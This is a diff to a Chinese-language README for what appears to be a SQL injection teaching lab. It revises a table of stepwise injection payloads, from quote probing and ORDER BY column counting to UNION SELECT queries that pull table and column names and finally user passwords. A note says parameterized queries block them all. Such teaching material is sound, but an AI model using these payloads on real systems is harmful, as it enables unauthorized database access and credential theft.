@@ -38,12 +38,12 @@ python3 app.py
 |:----:|---------|------|
 | 1 | `'` | 判断是否存在注入点 |
 | 2 | `' OR '1'='1` | 确认字符型注入 |
-| 3 | `' ORDER BY 3 --` | 探测列数 |
-| 4 | `' UNION SELECT 1,2,3 --` | 确定回显位置 |
-| 5 | `' UNION SELECT 1,database(),3 --` | 获取库名 |
-| 6 | `' UNION SELECT 1,group_concat(name),3 FROM sqlite_master --` | 获取表名 |
-| 7 | `' UNION SELECT 1,group_concat(name),3 FROM pragma_table_info('users') --` | 获取列名 |
-| 8 | `' UNION SELECT 1,password,3 FROM users --` | 获取数据 |
+| 3 | `' ORDER BY 4 --` | 探测列数（4列） |
+| 4 | `' UNION SELECT 1,2,3,4 --` | 确定回显位置 |
+| 5 | `' UNION SELECT 1,2,database(),4 --` | 获取库名 |
+| 6 | `' UNION SELECT 1,2,group_concat(name),4 FROM sqlite_master --` | 获取表名 |
+| 7 | `' UNION SELECT 1,2,group_concat(name),4 FROM pragma_table_info('users') --` | 获取列名 |
+| 8 | `' UNION SELECT 1,2,password,4 FROM users --` | 获取数据 |
 
 > 以上注入在参数化查询下**全部被拦截**，仅作为学习参考。
 
